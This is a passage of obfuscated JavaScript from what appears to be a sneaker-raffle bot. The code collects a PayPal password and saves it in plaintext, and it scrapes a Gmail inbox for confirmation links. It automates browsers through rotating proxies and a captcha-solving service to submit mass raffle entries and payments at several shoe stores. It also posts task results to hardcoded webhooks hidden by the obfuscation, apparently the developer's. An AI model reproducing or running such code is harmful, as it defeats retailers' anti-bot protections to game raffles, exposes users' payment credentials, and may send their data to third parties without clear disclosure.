        _0x187b09['Email'] = _0x414956['Email'];
        var _0x136803 = Math['round'](Math['random']() * (_0x3bedfa['length'] - 0x1));
        _0x187b09['Proxy'] = _0x3bedfa[_0x136803], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x10e0fb = await _0x15dd71['get']('Password');
        return _0x187b09['Password'] = _0x10e0fb['Password'], _0x3601e1['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x187b09['Email'] + ',' + _0x187b09['Password'] + ',' + _0x187b09['Proxy']), _0x187b09;
    }
    let _0x309e1a = await _0x1dc336();
    var _0x15e587 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0xa0970b = await _0x15dd71['get']('Amount'), _0x30eb8b = _0xa0970b['Amount'];
    async function _0x1407d0() {
        let _0xc2a59a = 0x0;
        var _0x2dee60 = new _0x2fec54({
            'user': _0x6a12f3['masterMail'],
            'password': _0x6a12f3['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0xde709e(_0x544b69) {
            _0x2dee60['openBox']('INBOX', ![], _0x544b69);
        }
        _0x2dee60['once']('ready', function () {
            _0xde709e(function (_0x3d596c, _0x534c21) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3d596c)
                    throw _0x3d596c;
                _0x2dee60['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3c9a91, _0x3b97ac) {
                    if (!_0x3b97ac || !_0x3b97ac['length'])
                        console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20No\x20mails\x20found'), _0x2dee60['end']();
                    else {
                        _0x3b97ac = _0x3b97ac['slice'](0x0, _0x30eb8b);
                        var _0x378bf9 = _0x2dee60['seq']['fetch'](_0x3b97ac, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x378bf9['on']('message', function (_0x5b6be3, _0x903304) {
                            var _0x137843 = '(#' + _0x903304 + ')\x20';
                            _0x5b6be3['on']('body', function (_0x21d15d, _0x2e9892) {
                                _0xe064d3(_0x21d15d, (_0x12fbea, _0x1eb991) => {
                                    if (_0x1eb991['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x1eb991['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x1eb991['text']['split']('[')[0x2];
                                        var _0x336df0 = mes['split'](']')[0x0];
                                        _0x15e587['push'](_0x336df0);
                                    }
                                });
                            }), _0x5b6be3['once']('end', function () {
                                _0xc2a59a++;
                            });
                        }), _0x378bf9['once']('error', function (_0x4952fa) {
                            console['log']('Fetch\x20error:\x20' + _0x4952fa);
                        }), _0x378bf9['once']('end', function () {
                            _0x2dee60['end']();
                        });
                    }
                });
            });
        }), _0x2dee60['once']('error', function (_0x519125) {
            console['log'](_0x1b5f76['red'](_0x519125['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2dee60['once']('end', async function () {
        }), _0x2dee60['connect']();
    }
    try {
        _0x1407d0(), await _0x1d2efb(0xfa0), console['log']('Found\x20' + _0x15e587['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1d2efb(0xfa0);
    }
    var _0x4528c7;
    _0xd208b3('' + _0xd28988);
    var _0xb97ca = _0x309e1a['Proxy']['split'](':'), _0x4afbbb;
    try {
        _0x4afbbb = await _0xd499ac['launch']({
            'userDataDir': 'sessions/' + _0x309e1a['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xb97ca[0x0] + ':' + _0xb97ca[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4afbbb = await _0xd499ac['launch']({
            'userDataDir': 'sessions/' + _0x309e1a['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xb97ca[0x0] + ':' + _0xb97ca[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Getting\x20Session');
        const _0x590f16 = await _0x4afbbb['newPage']();
        await _0x590f16['authenticate']({
            'username': '' + _0xb97ca[0x2],
            'password': '' + _0xb97ca[0x3]
        }), await _0x590f16['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x590f16['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x590f16['waitForSelector']('#email');
            let _0x360533 = await _0x590f16['$eval']('#email', _0x53c2f0 => _0x53c2f0['getAttribute']('value'));
            if (_0x360533 == '') {
                await _0x590f16['type']('#email', _0x309e1a['Email']), await _0x1d2efb(0x1d3);
                let _0x4d60ae = await _0x590f16['$']('#splitPassword');
                _0x4d60ae && (await _0x590f16['click']('#btnNext'), await _0x1d2efb(0xa28)), await _0x590f16['type']('#password', _0x309e1a['Password']), await _0x1d2efb(0x35c), await _0x590f16['click']('#btnLogin');
            } else
                await _0x590f16['type']('#password', _0x309e1a['Password']), await _0x1d2efb(0x35c), await _0x590f16['click']('#btnLogin');
            await _0x590f16['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Successfully\x20logged\x20in'), await _0x1d2efb(0x2710);
        } catch (_0x5d46a6) {
            throw new Error('Login\x20session\x20expired\x20' + _0x5d46a6);
        }
        for (var _0x4451d7 = 0x0; _0x4451d7 < _0x15e587['length']; _0x4451d7++) {
            console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20:\x20Starting\x20Verification'), _0xd208b3(_0xd28988 + '\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20/\x20' + _0x15e587['length']);
            const _0xa9cdf9 = await _0x4afbbb['newPage']();
            await _0xa9cdf9['goto']('' + _0x15e587[_0x4451d7], { 'waitUntil': 'networkidle2' }), await _0x1d2efb(0xbb8);
            try {
                const _0x298668 = await _0xa9cdf9['$']('#challenge-heading');
                _0x298668 && (console['log'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20:\x20' + _0x1b5f76['yellow']('2FA\x20Required')), await _0xa9cdf9['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1d2efb(0x9c40), await _0xa9cdf9['waitForSelector']('#payment-submit-btn'), await _0xa9cdf9['$eval']('#payment-submit-btn', _0x142760 => _0x142760['click']()), await _0xa9cdf9['click']('#payment-submit-btn');
                try {
                    await _0xa9cdf9['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1d2efb(0x5dc), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x39003c) {
                    _0x22d870 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x39003c['message']);
                } finally {
                    if (_0x22d870 == 'yes' && _0x285b3b != 0x2) {
                        console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xd28988['name'] + ']\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x285b3b + '\x20/\x205)')), _0x4451d7 = _0x4451d7 - 0x1, _0x285b3b = _0x285b3b + 0x1;
                        continue;
                    }
                    _0x22d870 == 'yes' && _0x285b3b >= 0x2 && (_0x12ac99(csv[_0x4451d7], _0xd28988), _0x22d870 = 'no', _0x285b3b = 0x0), await _0xa9cdf9['close'](), await _0x1d2efb(0x4650);
                }
            } catch (_0x22cf70) {
                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xd28988 + ']\x20Task\x20' + (_0x4451d7 + 0x1) + '\x20:\x20' + _0x22cf70));
            }
        }
    } catch (_0x1633cd) {
        console['log'](_0x1b5f76['red']('' + _0x1633cd));
    } finally {
        await _0x4afbbb['close']();
    }
}
const _0x41677c = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4e4d81, _0x4fa351, _0x3883f8) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x29180c = 0x0; _0x29180c < _0x4fa351['length']; _0x29180c++) {
                        if (_0x53e911 != 'yes')
                            var _0x53e911 = '', _0x234c08 = 0x0;
                        var _0x44591e;
                        try {
                            await _0x3cf8c0(_0x4fa351, _0x29180c);
                        } catch {
                            _0x53e911 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xd208b3(_0x4e4d81['name'] + '\x20Task\x20' + (_0x29180c + 0x1) + '\x20/\x20' + _0x4fa351['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        var _0x54ff1a = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x3815e2 = Math['round'](Math['random']() * (_0x54ff1a['length'] - 0x1));
                        _0x4fa351[_0x29180c]['Size'] == 'RANDOM' && (_0x4fa351[_0x29180c]['Size'] = _0x54ff1a[_0x3815e2]);
                        var _0xd5712c = Math['round'](Math['random']() * (_0x3883f8['length'] - 0x1)), _0x579485 = _0x3883f8[_0xd5712c]['split'](':'), _0x2fd99a;
                        try {
                            _0x2fd99a = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x579485[0x0] + ':' + _0x579485[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2fd99a = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x579485[0x0] + ':' + _0x579485[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x29f32e = await _0x2fd99a['newPage']();
                            await _0x29f32e['authenticate']({
                                'username': '' + _0x579485[0x2],
                                'password': '' + _0x579485[0x3]
                            }), await _0x29f32e['setRequestInterception'](!![]), _0x29f32e['on']('request', _0x34d9ba => {
                                _0x34d9ba['resourceType']() === 'image' || _0x34d9ba['resourceType']() === 'font' || _0x34d9ba['resourceType']() === 'media' ? _0x34d9ba['abort']() : _0x34d9ba['continue']();
                            }), await _0x29f32e['goto'](_0x4fa351[_0x29180c]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x29f32e['waitForSelector']('#accept-all-gdpr'), await _0x29f32e['click']('#accept-all-gdpr'), await _0x29f32e['waitForSelector']('#raffles-product'), await _0x1d2efb(0x3e8), await _0x29f32e['$eval']('#raffles-product', _0x1446ed => _0x1446ed['click']()), await _0x1d2efb(0x1388), await _0x29f32e['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1ea036 = await _0x29f32e['$']('.fancybox-inner\x20>\x20iframe'), _0x22acea = await _0x1ea036['contentFrame']();
                            console['log'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Checking\x20Information'), await _0x22acea['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x1d2efb(0x1f4), await _0x22acea['type']('input[name=\x22sm-form-email\x22]', _0x4fa351[_0x29180c]['Email']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-name\x22]', _0x4fa351[_0x29180c]['FirstName'] + '\x20' + _0x4fa351[_0x29180c]['LastName']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-street\x22]', _0x4fa351[_0x29180c]['Address1'] + '\x20' + _0x4fa351[_0x29180c]['HouseNumber'] + '\x20' + _0x4fa351[_0x29180c]['Address2']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-city\x22]', _0x4fa351[_0x29180c]['City']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-province\x22]', _0x4fa351[_0x29180c]['State']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-zip\x22]', _0x4fa351[_0x29180c]['Zip']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-country\x22]', _0x4fa351[_0x29180c]['Country']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-form-phone\x22]', _0x4fa351[_0x29180c]['Phone']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x4fa351[_0x29180c]['Follower']), await _0x1d2efb(0xc8), await _0x22acea['type']('input[name=\x22sm-cst.size\x22]', _0x4fa351[_0x29180c]['Size']), await _0x1d2efb(0x1f4), await _0x22acea['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x1d2efb(0x1f4), await _0x22acea['click']('.icheckbox_simple-custom'), await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x22acea['$eval']('form', _0x4b698c => _0x4b698c['submit']()), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x53e911 = '';
                            var _0x52d679 = await _0x3aa619(_0x4fa351[_0x29180c], _0x4e4d81, 'dev', ![]), _0x337e7f = await _0x3aa619(_0x4fa351[_0x29180c], _0x4e4d81, 'pub', ![]);
                            const _0x55b6e9 = {
                                'succesDEVMSG': { 'embeds': [_0x52d679] },
                                'succesPUBMSG': { 'embeds': [_0x337e7f] }
                            };
                            try {
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x55b6e9['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x55b6e9['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x55b6e9['succesPUBMSG']);
                            } catch (_0x5627be) {
                                console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5627be));
                            }
                        } catch (_0x4ba13b) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20' + _0x4ba13b)), _0x44591e = '' + _0x4ba13b;
                            var _0x34a6c6 = await _0x3aa619(_0x4fa351[_0x29180c], _0x4e4d81, 'dev', !![], _0x44591e), _0x52d679 = await _0x3aa619(_0x4fa351[_0x29180c], _0x4e4d81, 'dev', ![]), _0x337e7f = await _0x3aa619(_0x4fa351[_0x29180c], _0x4e4d81, 'pub', ![]);
                            const _0x9b6e02 = {
                                'succesDEVMSG': { 'embeds': [_0x52d679] },
                                'succesPUBMSG': { 'embeds': [_0x337e7f] }
                            };
                            _0x9b6e02['errorDEV'] = { 'embeds': [_0x34a6c6] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x9b6e02['errorDEV']), await _0x471d59(_0x32fdb9, _0x9b6e02['errorDEV']), _0x4ba13b != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x53e911 = 'yes');
                        } finally {
                            _0x2fd99a['close']();
                            if (_0x53e911 == 'yes' && _0x234c08 != 0x5 && _0x44591e != 'Size\x20Not\x20Found') {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Task\x20' + (_0x29180c + 0x1) + '\x20:\x20Retrying\x20(' + _0x234c08 + '\x20/\x205)\x20')), _0x29180c = _0x29180c - 0x1, _0x234c08 = _0x234c08 + 0x1;
                                continue;
                            }
                            _0x53e911 == 'yes' && _0x234c08 >= 0x5 && (_0x12ac99(_0x4fa351[_0x29180c], _0x4e4d81), _0x53e911 = 'no', _0x234c08 = 0x0), console['log'](_0x24cf02() + '\x20[' + _0x4e4d81['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x15da4f, _0x53c4b0) {
                    var _0x3f144d = [];
                    async function _0x483940() {
                        var _0x1f8dcb = new _0x2fec54({
                            'user': _0x6a12f3['masterMail'],
                            'password': _0x6a12f3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x200d28(_0x2c17af) {
                            _0x1f8dcb['openBox']('INBOX', ![], _0x2c17af);
                        }
                        _0x1f8dcb['once']('ready', function () {
                            _0x200d28(function (_0x67bfcc, _0x372786) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x67bfcc)
                                    throw _0x67bfcc;
                                _0x1f8dcb['seq']['search'](['UNSEEN'], function (_0x5cbd49, _0x36d3ec) {
                                    if (!_0x36d3ec || !_0x36d3ec['length'])
                                        console['log'](_0x24cf02() + '\x20[' + _0x15da4f['name'] + ']\x20No\x20mails\x20found'), _0x1f8dcb['end']();
                                    else {
                                        var _0x558093 = _0x1f8dcb['seq']['fetch'](_0x36d3ec, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x558093['on']('message', function (_0x36d19c, _0x261471) {
                                            var _0x412a2d = '(#' + _0x261471 + ')\x20';
                                            _0x36d19c['on']('body', function (_0x2042d6, _0x294e8e) {
                                                _0xe064d3(_0x2042d6, (_0x231ec1, _0x36c587) => {
                                                    if (_0x36c587['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x2f6666 = _0x36c587['html']['split']('\x0a');
                                                        for (var _0x188df3 = 0x0; _0x188df3 < _0x2f6666['length']; _0x188df3++) {
                                                            if (_0x2f6666[_0x188df3]['includes']('salesmanago') && _0x2f6666[_0x188df3]['includes']('<td') && _0x2f6666[_0x188df3]['includes']('href')) {
                                                                var _0x562d3a = _0x2f6666[_0x188df3]['split']('href=\x22'), _0x4c8621 = _0x562d3a[0x1]['split']('\x22')[0x0];
                                                                _0x3f144d['push'](_0x4c8621);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x36d19c['once']('end', function () {
                                            });
                                        }), _0x558093['once']('error', function (_0x5bc3be) {
                                            console['log']('Fetch\x20error:\x20' + _0x5bc3be);
                                        }), _0x558093['once']('end', function () {
                                            _0x1f8dcb['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1f8dcb['once']('error', function (_0xf33118) {
                            console['log'](_0x1b5f76['red'](_0xf33118['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x1f8dcb['once']('end', async function () {
                        }), _0x1f8dcb['connect']();
                    }
                    async function _0x1dcf2b(_0x94e3e8, _0x26950b, _0x2b9223) {
                        for (var _0x580580 = 0x0; _0x580580 < _0x26950b['length']; _0x580580++) {
                            async function _0x136d27(_0x40e25f, _0x43766d, _0x9c4452, _0x96b643, _0x1a0545) {
                                var _0x2e7110, _0x29287d = {}, _0x4b62bf = [], _0x3cf582 = {}, _0x5b5da9 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x379e6b = Math['round'](Math['random']() * (_0x5b5da9['length'] - 0x1));
                                _0x96b643[_0x40e25f]['Size'] == 'RANDOM' && (_0x96b643[_0x40e25f]['Size'] = _0x5b5da9[_0x379e6b]);
                                !_0x96b643 && (_0x96b643 = {});
                                if (_0x6a12f3['useRandomProxy'] = ![])
                                    var _0x5acd34 = _0x1a0545[_0x40e25f]['split'](':');
                                else
                                    var _0x3a5c03 = Math['round'](Math['random']() * (_0x1a0545['length'] - 0x1)), _0x5acd34 = _0x1a0545[_0x3a5c03]['split'](':');
                                var _0x55bcae = {
                                    'jar': _0x4054b9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x9c4452['url'],
                                    'headers': _0x9c4452['headers'],
                                    'body': JSON['stringify'](_0x29287d),
                                    'proxy': 'http://' + _0x5acd34[0x2] + ':' + _0x5acd34[0x3] + '@' + _0x5acd34[0x0] + ':' + _0x5acd34[0x1]
                                };
                                return _0x43766d != 'ver' && (_0x55bcae['url'] = _0x9c4452['url'], _0x55bcae['headers'] = _0x9c4452['headers']), _0x43766d == 'ver' && (_0x55bcae['method'] = 'GET', _0x55bcae['url'] = _0x96b643[_0x40e25f]), new Promise(function (_0xc8ee1f, _0x5cf51a) {
                                    callback = async (_0x36ff18, _0xa6d1a, _0x52ae05) => {
                                        if (!_0x36ff18 && _0xa6d1a['statusCode'] == 0xca || !_0x36ff18 && _0xa6d1a['statusCode'] == 0xc8) {
                                            if (_0x43766d != 'ver') {
                                                var _0x29b40d = await _0x3aa619(_0x96b643[_0x40e25f], _0x9c4452, 'dev', ![]), _0x190d96 = await _0x3aa619(_0x96b643[_0x40e25f], _0x9c4452, 'pub', ![]);
                                                const _0x3a0bfa = {
                                                    'succesDEVMSG': { 'embeds': [_0x29b40d] },
                                                    'succesPUBMSG': { 'embeds': [_0x190d96] }
                                                };
                                                if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                                    try {
                                                        await _0x471d59(_0x6a12f3['webhook'], _0x3a0bfa['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x3a0bfa['succesDEVMSG']), await _0x1d2efb(0xc8);
                                                try {
                                                    await _0x471d59(_0x1d6d5c, _0x3a0bfa['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x21396e(_0x96b643[_0x40e25f], _0x9c4452);
                                            }
                                            _0xc8ee1f(console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x9c4452['name'] + ']\x20Task\x20' + (_0x40e25f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x43766d != 'ver') {
                                                var _0x4a9dfd = '' + _0x36ff18, _0x1476b6 = await _0x3aa619(_0x96b643[_0x40e25f], _0x9c4452, 'dev', !![], _0x4a9dfd), _0x41fc6a = {};
                                                _0x41fc6a['errorDEV'] = { 'embeds': [_0x1476b6] }, _0x12ac99(_0x96b643[_0x40e25f], _0x9c4452), _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x41fc6a['errorDEV']), await _0x471d59(_0x32fdb9, _0x41fc6a['errorDEV']);
                                            }
                                            _0x5cf51a(console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x9c4452['name'] + ']\x20Task\x20' + (_0x40e25f + 0x1) + ':\x20' + _0x36ff18)));
                                        }
                                    };
                                    try {
                                        _0x43766d != 'ver' ? console['log'](_0x24cf02() + '\x20[' + _0x9c4452['name'] + ']\x20Task\x20' + (_0x40e25f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x29287d['data']['attributes']['email']) : console['log'](_0x24cf02() + '\x20[' + _0x9c4452['name'] + ']\x20Task\x20' + (_0x40e25f + 0x1) + ':\x20Fetching\x20Response'), _0x173581(_0x55bcae, callback);
                                    } catch (_0x1e8613) {
                                        console['log'](_0x24cf02() + '\x20Task\x20' + (_0x40e25f + 0x1) + ':\x20' + _0x1e8613);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x136d27(_0x580580, 'ver', _0x94e3e8, _0x26950b, _0x2b9223), console['log'](_0x24cf02() + '\x20[' + _0x94e3e8['name'] + ']\x20Sleeping\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            } catch (_0x3804e7) {
                            }
                        }
                    }
                    try {
                        _0x483940(), await _0x1d2efb(0xfa0), console['log']('Found\x20' + _0x3f144d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1dcf2b(_0x15da4f, _0x3f144d, _0x53c4b0);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x53c2e4, _0x4e71f6, _0x4cf87e) {
                for (var _0x25ec0d = 0x0; _0x25ec0d < _0x4e71f6['length']; _0x25ec0d++) {
                    _0x6a12f3['AfewDelay'] = _0x6a12f3['delay'];
                    var _0x589496;
                    if (_0x34649c != 'yes')
                        var _0x34649c = '', _0x52754b = 0x0;
                    var _0x43c94e = _0x4e71f6[_0x25ec0d]['Url'], _0x48d7f1 = _0x4e71f6[_0x25ec0d];
                    _0xd208b3(_0x53c2e4['name'] + '\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20/\x20' + _0x4e71f6['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                    try {
                        await _0x3cf8c0(_0x4e71f6, _0x25ec0d);
                    } catch {
                        _0x34649c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x5d8551(_0x3c5dcf) {
                        const _0x3e42b8 = _0x3601e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x40a390 = _0x199bc3['parse'](_0x3e42b8, { 'header': !![] })['data'];
                        let _0x4aa9c8 = ![];
                        for (var _0x157ab1 of _0x40a390) {
                            if (_0x157ab1['Url'] == _0x3c5dcf['Url'] && _0x157ab1['Email'] == _0x3c5dcf['Email']) {
                                _0x4aa9c8 = !![];
                                break;
                            }
                        }
                        return _0x4aa9c8;
                    }
                    if (await _0x5d8551(_0x4e71f6[_0x25ec0d]) == !![]) {
                        console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x565ef4 = await _0x3aa619(_0x4e71f6[_0x25ec0d], _0x53c2e4, 'dev', ![]), _0x441eaa = await _0x3aa619(_0x4e71f6[_0x25ec0d], _0x53c2e4, 'pub', ![]);
                    const _0x5359aa = {
                        'succesDEVMSG': { 'embeds': [_0x565ef4] },
                        'succesPUBMSG': { 'embeds': [_0x441eaa] }
                    };
                    if (_0x4e71f6[_0x25ec0d]['Email'] == '' || _0x4e71f6[_0x25ec0d]['FirstName'] == '' || _0x4e71f6[_0x25ec0d]['LastName'] == '' || _0x4e71f6[_0x25ec0d]['Country'] == '' || _0x4e71f6[_0x25ec0d]['Size'] == '' || _0x4e71f6[_0x25ec0d]['Address1'] == '' || _0x4e71f6[_0x25ec0d]['Zip'] == '') {
                        console['log'](_0x24cf02() + '\x20[' + _0x53c2e4['name'] + ']\x20Task\x20' + (_0x25ec0d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x6a12f3['useRandomProxy'] = ![])
                        var _0x205d6a = _0x4cf87e[_0x25ec0d]['split'](':');
                    else
                        var _0x5facd4 = Math['round'](Math['random']() * (_0x4cf87e['length'] - 0x1)), _0x205d6a = _0x4cf87e[_0x5facd4]['split'](':');
                    var _0x9005ae;
                    try {
                        _0x9005ae = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x205d6a[0x0] + ':' + _0x205d6a[0x1],
